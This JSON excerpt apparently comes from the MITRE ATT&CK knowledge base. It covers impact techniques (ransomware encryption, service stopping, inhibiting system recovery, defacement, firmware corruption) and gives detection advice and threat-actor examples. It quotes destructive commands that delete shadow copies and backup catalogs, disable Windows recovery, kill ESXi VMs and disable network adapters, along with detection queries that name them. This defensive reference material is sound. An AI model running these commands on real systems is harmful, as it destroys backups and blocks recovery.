    "Description": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.Cloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.[1][2][3]If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once.For example, in AWS environments, an adversary with thePutLifecycleConfigurationpermission may use thePutBucketLifecycleAPI call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.[4][5]In addition to destroying data for purposes of extortion andFinancial Theft, adversaries may also perform this action on buckets storing cloud logs forIndicator Removal.[6]",
    "Detects": [
      "Monitor for unexpected use of lifecycle policies. Where lifecycle policies are already in use, monitor for changes to cloud storage configurations and policies, such as buckets configured in the policy or unusually short retention periods. In AWS environments, monitor forPutBucketLifecycleevents with arequestParameters.LifecycleConfiguration.Rule.Expiration.Daysattribute below expected values.[6]"
    ],
    "Procedure Examples": [
      "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.[7]Ensure backups are stored off system and protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.",
      "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g.,PutLifecycleConfigurationin AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of thePutBucketLifecycleAPI call."
    ]
  },
  "T1486": {
    "Name": "Data Encrypted for Impact",
    "Description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.[1][2][3][4]In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such asFile and Directory Permissions ModificationorSystem Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files.[5]In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.[3]Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.[6]To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[2][3]Encryption malware may also leverageInternal Defacement, such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").[7][8]In cloud environments, storage objects within compromised accounts may also be encrypted.[9]For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.[10]",
    "Detects": [
      "Monitor for changes made in cloud environments for events that indicate storage objects have been anomalously modified.",
      "Monitor executed commands and arguments for actions involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit.",
      "Monitor for newly constructed files in user directories.",
      "Monitor for changes made to files in user directories.",
      "Monitor for unexpected network shares being accessed on target systems or on large numbers of systems.",
      "Monitor for newly constructed  processes and/or command-lines involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit."
    ],
    "Procedure Examples": [
      "Akiracan encrypt victim filesystems for financial extortion purposes including through the use of the ChaCha20 and ChaCha8 stream ciphers.[11][12][13]",
      "Akiraencrypts files in victim environments as part of ransomware operations.[14][12]",
      "TheAkira _v2encryptor targets the/vmfs/volumes/path by default and can use the rust-crypto 0.2.36 library crate for the encryption processes.[13][15]",
      "Apostlecreates new, encrypted versions of files then deletes the originals, with the new filenames consisting of a random GUID and \".lock\" for an extension.[16]",
      "APT38has used Hermes ransomware to encrypt files with AES256.[17]",
      "APT41used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.[18]APT41also used Microsoft Bitlocker to encrypt workstations and Jetico’s BestCrypt to encrypt servers.[19]",
      "Avaddonencrypts the victim system using a combination of AES256 and RSA encryption schemes.[20]",
      "AvosLockerhas encrypted files and network resources using AES-256 and added an.avos,.avos2, or.AvosLinuxextension to filenames.[21][22][23][24]",
      "Babukcan use ChaCha8 and ECDH to encrypt data.[25][26][27][28]",
      "Bad Rabbithas encrypted files and disks using AES-128-CBC and RSA-2048.[29]",
      "BitPaymercan import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending.lockedto the filename.[30]",
      "Black Bastacan encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.[31][32][33][34][35][36][37][38][39]Black Bastahas also encrypted files while the victim system is in safe mode, appending.bastaupon completion.[40]",
      "BlackBytehas encrypted victim files for ransom. Early versions of BlackByte ransomware used a common key for encryption, but later versions use unique keys per victim.[41][42][43][44][45]",
      "BlackByte 2.0 Ransomwareis a ransomware variant associated withBlackByteoperations.[44]",
      "BlackByte Ransomwareis ransomware using a shared key across victims for encryption.[46]",
      "BlackCathas the ability to encrypt Windows devices, Linux devices, and VMWare instances.[47]",
      "DuringC0015, the threat actors usedContiransomware to encrypt a compromised network.[48]",
      "DuringC0018, the threat actors usedAvosLockerransomware to encrypt files on the compromised network.[23][49]",
      "Cheerscryptcan encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve Diffie–Hellman (ECDH) generated key.[50][51]",
      "Clopcan encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files.[52][53][54]",
      "Contican useCreateIoCompletionPort(),PostQueuedCompletionStatus(), andGetQueuedCompletionPort()to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim.Contican use \"Windows Restart Manager\" to ensure files are unlocked and open for encryption.[55][5][56][57][48]",
      "Cubahas the ability to encrypt system data and add the \".cuba\" extension to encrypted files.[58]",
      "DarkGatecan deploy follow-on ransomware payloads.[59]",
      "DCSrvhas encrypted drives using the core encryption mechanism from DiskCryptor.[60]",
      "DEATHRANSOMcan use public and private key pair encryption to encrypt files for ransom payment.[61]",
      "Diavolhas encrypted files using an RSA key though theCryptEncryptAPI and has appended filenames with \".lock64\".[62]",
      "Egregorcan encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note.[7][63]",
      "EKANSuses standard encryption library functions to encrypt files.[64][65]",
      "FIN7has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.[66][67]",
      "FIN8has deployed ransomware such asRagnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks.[68]",
      "FIVEHANDScan use an embedded NTRU public key to encrypt data for ransom.[61][69][70]",
      "HELLOKITTYcan use an embedded RSA-2048 public key to encrypt victim data for ransom.[61]",
      "DuringHomeLand Justice, threat actors usedROADSWEEPransomware to encrypt files on targeted systems.[71][72][73]",
      "INC Ransomhas usedINC Ransomwareto encrypt victim's data.[74][75][76][77][78][79]",
      "INC Ransomwarecan encrypt data on victim systems, including through the use of partial encryption and multi-threading to speed encryption.[74][75][78][79][74]",
      "Indrik Spiderhas encrypted domain-controlled systems usingBitPaymer.[30]Additionally,Indrik SpiderusedPsExecto execute a ransomware script.[80]",
      "JCryhas encrypted files and demanded Bitcoin to decrypt those files.[81]",
      "KillDiskhas a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.[82]",
      "LockBit 2.0can use standard AES and elliptic-curve cryptography algorithms to encrypt victim data.[83][84]",
      "LockBit 3.0can encrypt targeted data using the AES-256, ChaCha20, or RSA-2048 algorithms.[85][86][87][88]",
      "LockerGogahas encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.[89][90][91]",
      "Magic Houndhas used BitLocker and DiskCryptor to encrypt targeted workstations.[92][93]",
      "Mazehas disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made.Mazehas used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.[94]",
      "MegaCortexhas used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.[95][96]",
      "Megazordcan encrypt files on targeted Windows hosts leaving them with a  \".powerranges\" file extension.[12][13][15]",
      "Moneybirdtargets a common set of file types such as documents, certificates, and database files for encryption while avoiding executable, dynamic linked libraries, and similar items.[97]",
      "Moonstone Sleethas deployed ransomware in victim environments.[98]",
      "Netwalkercan encrypt files on infected machines to extort victims.[99]",
      "NotPetyaencrypts user files and disk structures like the MBR with 2048-bit RSA.[100][3][101]",
      "Pay2Keycan encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.[102][103]",
      "Playcryptencrypts files on targeted hosts with an AES-RSA hybrid encryption, encrypting every other file portion of 0x100000 bytes.[104][105]",
      "Prestigehas leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with.enc.[106]",
      "ProLockcan encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.[107]",
      "Pysahas used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions.[108]",
      "Ragnar Lockerencrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.[109][110]",
      "RansomHubcan use Elliptic Curve Encryption to encrypt files on targeted systems.[111]RansomHubcan also skip content at regular intervals (ex. encrypt 1 MB, skip 3 MB) to optomize performance and enable faster encryption for large files.[112]",
      "REvilcan encrypt files on victim systems and demands a ransom to decrypt the files.[113][114][115][116][117][118][119][120]",
      "ROADSWEEPcan RC4 encrypt content in blocks on targeted systems.[71][72][73]",
      "RobbinHoodwill search for an RSA encryption key and then perform its encryption process on the system files.[121]",
      "Royaluses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.[122][123][124]",
      "Ryukhas used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.[125][57]",
      "SamSamencrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.[126]",
      "Sandworm Teamhas usedPrestigeransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.[106]",
      "Scattered Spiderhas used BlackCat ransomware to encrypt files on VMWare ESXi servers.[127][128]",
      "Seth-Lockercan encrypt files on a targeted system, appending them with the suffix .seth.[28]",
      "Shamoonhas an operational mode for encrypting data instead of overwriting it.[129][130]",
      "ShrinkLockeruses the legitimate BitLocker application to encrypt victim files for ransom.[131][132]",
      "Storm-1811is a financially-motivated entity linked to the deployment ofBlack Bastaransomware in victim environments.[133]",
      "SynAckencrypts the victims machine followed by asking the victim to pay a ransom.[134]",
      "TA505has used a wide variety of ransomware, such asClop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.[135]",
      "ThiefQuestencrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.[136]",
      "WannaCryencrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.[137][2][138]",
      "WastedLockercan encrypt data and leave a ransom note.[139][140][141]",
      "Xbashhas maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.[142]",
      "XCSSETperforms AES-CBC encryption on files under~/Documents,~/Downloads, and~/Desktopwith a fixed key and renames files to give them a.encextension. Only files with sizes less than 500MB are encrypted.[143]"
    ]
  },
  "T1489": {
    "Name": "Service Stop",
    "Description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.[1][2]Adversaries may accomplish this by disabling individual services of high importance to an organization, such asMSExchangeIS, which will make Exchange content inaccessible.[2]In some cases, adversaries may stop or disable many or all services to render systems unusable.[1]Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conductData DestructionorData Encrypted for Impacton the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments that may stop or disable services on a system to render those services unavailable to legitimate users. On ESXi servers, monitor for suspicious commands that terminate VMs, such asesxcli vm process kill,pkill –9 vmx-*, orvim-cmd vmsvc/power.off.[4][59][60]",
      "Monitor for changes made to files that may stop or disable services on a system to render those services unavailable to legitimate users.",
      "Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example,ChangeServiceConfigWmay be used by an adversary to prevent services from starting.[1]",
      "Monitor for newly executed processes that may stop or disable services on a system to render those services unavailable to legitimate users.",
      "Monitor processes and command-line arguments to see if critical processes are terminated or stop running. On ESXi servers, monitor for suspicious termination of VM processes, such as many VMs shutting down at once.[59]",
      "Alterations to the service binary path or the service startup type changed to disabled may be suspicious.",
      "Monitor for changes made to windows registry keys and/or values that may stop or disable services on a system to render those services unavailable to legitimate users."
    ],
    "Procedure Examples": [
      "Akira _v2can stop running virtual machines.[5][6][7]",
      "Avaddonlooks for and attempts to stop database processes.[8]",
      "AvosLockerhas terminated specific processes before encryption.[9]",
      "Babukcan stop specific services related to backups.[10][11][12]",
      "BlackByte 2.0 Ransomwarecan terminate running services.[13]",
      "BlackCathas the ability to stop VM services on compromised networks.[14][15]",
      "Cheerscrypthas the ability to terminate VM processes on compromised hosts through execution ofesxcli vm process kill.[16]",
      "Clopcan kill several processes and services related to backups and security solutions.[17][18]",
      "Contican stop up to 146 Windows services related to security, backup, database, and email solutions through the use ofnet stop.[19]",
      "Cubahas a hardcoded list of services and processes to terminate.[20]",
      "Diavolwill terminate services using the Service Control Manager (SCM) API.[21]",
      "EKANSstops database, data backup solution, antivirus, and ICS-related processes.[22][23][24]",
      "Hannotogcan stop Windows services.[25]",
      "HermeticWiperhas the ability to stop the Volume Shadow Copy service.[26]",
      "HotCroissanthas the ability to stop services on the infected host.[27]",
      "INC Ransomwarecan issue a command to kill a process on compromised hosts.[28]",
      "Indrik Spiderhas usedPsExecto stop services prior to the execution of ransomware.[29]",
      "Industroyer’s data wiper module writes zeros into the registry keys inSYSTEM\\CurrentControlSet\\Servicesto render a system inoperable.[30]",
      "KillDiskterminates various processes to get the user to reboot the victim machine.[31]",
      "LAPSUS$has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.[32]",
      "Lazarus Grouphas stopped the MSExchangeIS service to render Exchange contents inaccessible to users.[33]",
      "LockBit 2.0can automatically terminate processes that may interfere with the encryption or file extraction processes.[34]",
      "LockBit 3.0can terminate targeted processes and services related to security, backup, database management, and other applications that could stop or interfere with encryption.[35][36][37][38]",
      "LookBackcan kill processes and delete services.[39]",
      "Mazehas stopped SQL services to ensure it can encrypt any database.[40]",
      "MegaCortexcan stop and disable services on the system.[41]",
      "Megazordhas the ability to terminate a list of services and processes.[7]",
      "Meteorcan disconnect all network adapters on a compromised host usingpowershell -Command \"Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }\" > NUL.[42]",
      "Netwalkercan terminate system processes and services, some of which relate to backup software.[43]",
      "Olympic Destroyeruses the API callChangeServiceConfigWto disable all services on the affected system.[1]",
      "Pay2Keycan stop the MS SQL service at the end of the encryption process to release files locked by the service.[44]",
      "Prestigehas attempted to stop the MSSQL Windows service to ensure successful encryption usingC:\\Windows\\System32\\net.exe stop MSSQLSERVER.[45]",
      "Pysacan stop services and processes.[46]",
      "Ragnar Lockerhas attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.[47]",
      "RansomHubhas the ability to terminate specified services.[48]",
      "REvilhas the capability to stop services and kill processes.[49][50]",
      "ROADSWEEPcan disable critical services and processes.[51]",
      "RobbinHoodstops 181 Windows services on the system before beginning the encryption process.[52]",
      "Royalcan useRmShutDownto kill  applications and services using the resources that are targeted for encryption.[53]",
      "Ryukhas calledkill.batfor stopping services, disabling services and killing processes.[54]",
      "Sandworm Teamattempts to stop the MSSQL Windows service to ensure successful encryption of locked files.[45]",
      "SLOTHFULMEDIAhas the capability to stop processes and services.[55]",
      "WannaCryattempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.[56][3]",
      "Wizard Spiderhas used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.[57]"
    ]
  },
  "T1490": {
    "Name": "Inhibit System Recovery",
    "Description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.[1][2]This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects ofData DestructionandData Encrypted for Impact.[1][2]Furthermore, adversaries may disable recovery notifications, then corrupt backups.[3]A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:vssadmin.execan be used to delete all volume shadow copies on a system -vssadmin.exe delete shadows /all /quietWindows Management Instrumentationcan be used to delete volume shadow copies -wmic shadowcopy deletewbadmin.execan be used to delete the Windows Backup Catalog -wbadmin.exe delete catalog -quietbcdedit.execan be used to disable automatic Windows recovery features by modifying boot configuration data -bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled noREAgentC.execan be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected systemdiskshadow.execan be used to delete all volume shadow copies on a system -diskshadow delete shadows all[4][5]On network devices, adversaries may leverageDisk Wipeto delete backup firmware images and reformat the file system, thenSystem Shutdown/Rebootto reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to supportData Encrypted for Impact, preventing them from being leveraged as backups (e.g., viavim-cmd vmsvc/snapshot.removeall).[6]Adversaries may also delete \"online\" backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.[7]In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.[8][9]",
    "Detects": [
      "Monitor for unexpected deletion of a cloud storage objects (ex: AWSDeleteObject), especially those associated with cloud backups.",
      "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such asvssadmin,wbadmin, andbcdedit.",
      "The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.",
      "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such asvssadmin,wbadmin, andbcdedit. After compromising a network of systems, threat actors often try to delete/resize Shadow Copy in an attempt to prevent administrators from restoring the systems to versions present before the attack. This is often done via vssadmin, a legitimate Windows tool to interact with shadow copies. This action is often employed by ransomware, may lead to a failure in recovering systems after an attack. The pseudo code detection focus on Windows Security and Sysmon process creation (4688 and 1). The use of wmic to delete shadow copy generates WMI-Activity Operationnal 5857 event and could generate 5858 (if the operation fails). These 2 EventIDs could be interesting when attackers use wmic without process creation and/or for forensics.Analytic 1 - Detecting Shadow Copy Deletion or Resize(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")(CommandLine=\"vssadmindeleteshadows\" OR CommandLine=\"wmicshadowcopydelete\" OR CommandLine=\"vssadminresizeshadowstorage\")) OR (EventCode=\"5857\" ProviderName=\"MSVSS__PROVIDER\") OR (EventCode=\"5858\" Operation=\"Win32_ShadowCopy\")Analytic 2 - BCDEdit Failure Recovery Modification(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"C:\\Windows\\System32\\bcdedit.exe\" AND CommandLine=\"recoveryenabled\"",
      "Monitor the status of services involved in system recovery.Note: For Windows, Event ID 7040 can be used to alert on changes to the start type of a service (e.g., going from enabled at startup to disabled) associated with system recovery.",
      "Monitor for unexpected deletion of snapshots (ex: AWSDeleteSnapshot,DeleteDBSnapshot), especially those associated with cloud backups.",
      "Monitor the registry for changes associated with system recovery features (ex: the creation ofHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage)."
    ],
    "Procedure Examples": [
      "Akirawill delete system volume shadow copies via PowerShell commands.[10][11]",
      "Avaddondeletes backups and shadow copies using native system tools.[12][13]",
      "Babukhas the ability to delete shadow volumes usingvssadmin.exe delete shadows /all /quiet.[14][15]",
      "BFG Agonizerwipes the boot sector of infected machines to inhibit system recovery.[16]",
      "BitPaymerattempts to remove the backup shadow files from the host usingvssadmin.exe Delete Shadows /All /Quiet.[17]",
      "Black Bastacan delete shadow copies using vssadmin.exe.[18][19][20][21][22][23][24][25][25][26]",
      "BlackByteresized and deleted volume shadow copy files to prevent system recovery after encryption.[27][28]",
      "BlackByte 2.0 Ransomwaremodifies volume shadow copies during execution in a way that destroys them on the victim machine.[29]",
      "BlackByte Ransomwaredeletes all volume shadow copies and restore points among other actions to inhibit system recovery following ransomware deployment.[30]",
      "BlackCatcan delete shadow copies usingvssadmin.exe delete shadows /all /quietandwmic.exe Shadowcopy Delete; it can also modify the boot loader usingbcdedit /set {default} recoveryenabled No.[31]",
      "Clopcan delete the shadow volumes withvssadmin Delete Shadows /all /quietand can use bcdedit to disable recovery options.[32]",
      "Confickerresets system restore points and deletes backup files.[33]",
      "Contican delete Windows Volume Shadow Copies usingvssadmin.[34]",
      "DarkGatecan delete system restore points through the commandcmd.exe /c vssadmin delete shadows /for=c: /all /quiet\".[35]",
      "DarkWatchmancan delete shadow volumes usingvssadmin.exe.[36]",
      "DEATHRANSOMcan delete volume shadow copies on compromised hosts.[37]",
      "Diavolcan delete shadow copies using theIVssBackupComponentsCOM object to call theDeleteSnapshotsmethod.[38]",
      "EKANSremoves backups of Volume Shadow Copies to disable any restoration capabilities.[39][40]",
      "FIVEHANDShas the ability to delete volume shadow copies on compromised hosts.[37][41]",
      "H1N1disable recovery options and deletes shadow copies from the victim.[42]",
      "HELLOKITTYcan delete volume shadow copies on compromised hosts.[37]",
      "HermeticWipercan disable the VSS service on a compromised host using the service control manager.[43][44][45]",
      "INC Ransomwarecan delete volume shadow copy backups from victim machines.[46]",
      "InvisiMolecan can remove all system restore points.[47]",
      "JCryhas been observed deleting shadow copies to ensure that data cannot be restored easily.[48]",
      "LockBit 2.0has the ability to delete volume shadow copies on targeted hosts.[49][50]",
      "LockBit 3.0can delete volume shadow copies.[51][52][53]",
      "Mazehas attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.[54][55]",
      "MegaCortexhas deleted volume shadow copies usingvssadmin.exe.[56]",
      "Meteorcan usebcdeditto delete different boot identifiers on a compromised host; it can also usevssadmin.exe delete shadows /all /quietandC:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete.[57]",
      "MultiLayer Wiperwipes the boot sector of infected systems to inhibit system recovery.[16]",
      "Netwalkercan delete the infected system's Shadow Volumes to prevent recovery.[58][59]",
      "Olympic Destroyeruses the native Windows utilitiesvssadmin,wbadmin, andbcdeditto delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.[1]",
      "Playcryptcan use AlphaVSS to delete shadow copies.[60]",
      "Prestigecan delete the backup catalog from the target system using:c:\\Windows\\System32\\wbadmin.exe delete catalog -quietand can also delete volume shadow copies using:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet.[61]",
      "ProLockcan use vssadmin.exe to remove volume shadow copies.[62]",
      "Pysahas the functionality to delete shadow copies.[63]",
      "Ragnar Lockercan delete volume shadow copies usingvssadmin delete shadows /all /quiet.[64]",
      "RansomHubhas usedvssadmin.exeto delete volume shadow copies.[65][66]",
      "REvilcan use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.[67][68][69][70][71][72][73][74][75]",
      "ROADSWEEPhas the ability to disableSystemRestoreand Volume Shadow Copies.[76][77]",
      "RobbinHooddeletes shadow copies to ensure that all the data cannot be restored easily.[78]",
      "Royalcan delete shadow copy backups with vssadmin.exe using the commanddelete shadows /all /quiet.[79][80][81]",
      "Ryukhas usedvssadmin Delete Shadows /all /quietto to delete volume shadow copies andvssadmin resize shadowstorageto force deletion of shadow copies created by third-party applications.[82]",
      "Sandworm TeamusesPrestigeto delete the backup catalog from the target system using:C:\\Windows\\System32\\wbadmin.exe delete catalog -quietand to delete volume shadow copies using:C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet.[61]",
      "WannaCryusesvssadmin,wbadmin,bcdedit, andwmicto delete and disable operating system recovery features.[83][2][84]",
      "WastedLockercan delete shadow volumes.[85][86][87]",
      "Wizard Spiderhas used WMIC and vssadmin to manually delete volume shadow copies.Wizard Spiderhas also usedContiransomware to delete volume shadow copies automatically with the use of vssadmin.[88]"
    ]
  },
  "T1491": {
    "Name": "Defacement",
    "Description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons forDefacementinclude delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part ofDefacementin order to cause user discomfort, or to pressure compliance with accompanying messages.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may modify visual content available internally or externally to an enterprise network.",
      "Monitor for newly constructed visual content for internal or external enterprise networks.",
      "Monitor for changes made to files for unexpected modifications to internal and external websites for unplanned content changes.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access internal and external websites and services). Consider correlating with application monitoring for indication of unplanned service interruptions or unauthorized content changes."
    ],
    "Procedure Examples": [
      "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.[1]Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
    ]
  },
  "T1491.001": {
    "Name": "Defacement:Internal Defacement",
    "Description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.[1][2]Disturbing or offensive images may be used as a part ofInternal Defacementin order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.[3]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may deface systems internal to an organization in an attempt to intimidate or mislead users.",
      "Monitor for newly constructed files that may deface systems internal to an organization in an attempt to intimidate or mislead users.",
      "Monitor internal and websites for unplanned content changes.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "Black Bastahas set the desktop wallpaper on victims' machines to display a ransom note.[4][5][6][7][8][9][10][11][12]",
      "BlackByteleft ransom notes in all directories where encryption takes place.[13]",
      "BlackCatcan change the desktop wallpaper on compromised hosts.[14][15]",
      "After encryption,Diavolwill capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text \"All your files are encrypted! For more information see \"README-FOR-DECRYPT.txt\".[16]",
      "Gamaredon Grouphas left taunting images and messages on the victims' desktops as proof of system access.[17]",
      "INC Ransomwarehas the ability to change the background wallpaper image to display the ransom note.[18][19]",
      "Lazarus Groupreplaced the background wallpaper of systems with a threatening image after rendering the system unbootable with aDisk Structure Wipe.[3]",
      "Meteorcan change both the desktop wallpaper and the lock screen image to a custom image.[20]",
      "RansomHubhas placed a ransom note on comrpomised systems to warn victims and provide directions for how to retrieve data.[21]",
      "ROADSWEEPhas dropped ransom notes in targeted folders prior to encrypting the files.[22]",
      "ShrinkLockerrenames disk labels on victim hosts to the threat actor's email address to enable the victim to contact the threat actor for ransom negotiation.[23][24]"
    ]
  },
  "T1491.002": {
    "Name": "Defacement:External Defacement",
    "Description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users.External Defacementmay ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.[1][2][3]External Defacementmay be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such asDrive-by Compromise.[4]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users.",
      "Monitor for newly constructed files that may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users.",
      "Monitor external websites for unplanned content changes.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "Ember Bearis linked to the defacement of several Ukrainian organization websites.[5]",
      "Sandworm Teamdefaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.[6][7]"
    ]
  },
  "T1495": {
    "Name": "Firmware Corruption",
    "Description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.[1]Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.[2][3]Depending on the device, this attack may also result inData Destruction.",
    "Detects": [
      "Monitor for changes made to the firmware for unexpected modifications to settings and/or data.[6]Log attempts to read/write to BIOS and compare against known patching behavior."
    ],
    "Procedure Examples": [
      "Bad Rabbithas used an executable that installs a modified bootloader to prevent normal boot-up.[4]",
      "TrickBotmodule \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device.[5]"
